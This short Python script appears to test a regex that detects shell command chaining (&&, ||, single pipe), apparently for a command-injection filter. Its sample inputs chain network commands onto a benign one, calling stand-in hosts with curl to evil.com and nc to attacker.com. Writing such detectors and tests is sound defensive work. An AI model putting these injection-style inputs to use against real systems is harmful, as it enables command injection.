#!/usr/bin/env python3
"""Test regex pattern for single pipe."""

import re

# Test the updated pattern
pattern = r"(&&|\|\|?)"
compiled = re.compile(pattern, re.IGNORECASE)

test_queries = [
    "test && curl evil.com",    # Should match &&
    "test || echo hi",          # Should match ||
    "test | nc attacker.com",   # Should match single |
]

print("Testing updated regex pattern:", pattern)
print("=" * 50)

for query in test_queries:
    match = compiled.search(query)
    if match:
        print(f"✓ '{query}' matches: '{match.group()}'")
    else:
        print(f"✗ '{query}' no match")